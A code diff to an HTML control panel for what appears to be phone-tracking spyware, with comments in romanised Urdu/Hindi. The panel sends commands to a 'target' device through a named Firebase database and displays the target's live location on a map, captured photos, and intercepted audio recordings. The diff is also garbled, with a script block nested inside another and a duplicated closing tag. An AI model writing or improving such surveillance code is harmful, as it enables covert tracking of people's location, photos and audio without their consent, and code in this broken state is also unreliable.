@@ -76,57 +76,67 @@
     const db = firebase.database();
 
     // 2. Command Function
-function sendCommand(action) {
-    const tid = document.getElementById('targetIdInput').value.trim();
-    // Database path ko Screenshot (132) ke mutabiq set kiya gaya hai
-    db.ref('commands/' + tid).set({
-        action: action,
-        timestamp: Date.now()
-    });
-}
+<script>
+    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+    const db = firebase.database();
 
-// Data listen karne ke liye:
-db.ref('targets/' + tid).on('value', (snap) => {
-    const data = snap.val();
-    if (data) {
-        // Location aur Photos yahan se display honge
-        console.log("Data Received:", data);
-    }
-});
-    
+    // 2. Command Function
+    function sendCommand(action) {
+        const tid = document.getElementById('targetIdInput').value.trim();
+        if (!tid) { alert("Pehle Target ID likhen!"); return; }
+        
+        document.getElementById('targetStatus').innerText = "SENDING...";
+        
+        db.ref('commands/' + tid).set({
+            action: action,
+            timestamp: Date.now()
+        }).then(() => {
+            setTimeout(() => { document.getElementById('targetStatus').innerText = "ONLINE"; }, 1500);
+        });
     }
 
     // 3. Real-time Data Listener
+    // Jab aap Input box mein ID likh kar 'Enter' dabayenge ya bahar click karenge, ye shuru hoga
     document.getElementById('targetIdInput').addEventListener('change', function() {
         const tid = this.value.trim();
         if (!tid) return;
 
-        // Listen for Location
+        console.log("Monitoring Target: " + tid);
+        document.getElementById('targetStatus').innerText = "SYNCING...";
+
+        // A. Listen for Location
         db.ref('targets/' + tid + '/location').on('value', (snap) => {
             const loc = snap.val();
             if (loc) {
-                document.getElementById('locDisplay').innerHTML = `LAT: ${loc.lat} | LNG: ${loc.lng} | ACC: ${loc.accuracy} | LAST SEEN: ${loc.last_seen}`;
-                document.getElementById('mapFrame').src = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
+                document.getElementById('locDisplay').innerHTML = `LAT: ${loc.lat} | LNG: ${loc.lng} <br> TIME: ${loc.last_seen || 'N/A'}`;
+                // Map update
+                const mapUrl = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
+                document.getElementById('mapFrame').src = mapUrl;
             }
         });
 
-        // Listen for Photos
+        // B. Listen for Photos
+        // 'gallery' ko khali kar dete hain naye target ke liye
+        document.getElementById('gallery').innerHTML = ""; 
         db.ref('targets/' + tid + '/photos').on('child_added', (snap) => {
             const photo = snap.val();
             const img = document.createElement('img');
-            img.src = photo.img;
+            img.src = photo.img || photo.image; // Dono formats support honge
             document.getElementById('gallery').prepend(img);
         });
 
-        // Listen for Audios (Ye wo part hai jo aapne pucha tha)
+        // C. Listen for Audios
+        document.getElementById('audioList').innerHTML = "";
         db.ref('targets/' + tid + '/audios').on('child_added', (snap) => {
-            const audioData = snap.val().audio || snap.val().data; // Both keys supported
+            const audioData = snap.val().audio || snap.val().data;
             if (audioData) {
                 const container = document.createElement('div');
-                container.style.marginBottom = "10px";
+                container.style.borderBottom = "1px solid #111";
+                container.style.padding = "5px";
                 
                 const timeLabel = document.createElement('div');
-                timeLabel.innerText = "Intercepted: " + (snap.val().timestamp || "Just now");
+                timeLabel.innerText = "Captured: " + (snap.val().time || "Recent");
                 timeLabel.style.fontSize = "10px";
 
                 const audio = document.createElement('audio');
@@ -148,6 +158,8 @@ db.ref('targets/' + tid).on('value', (snap) => {
         }
     }
 </script>
+</script>
 </body>
 </html>
+
 
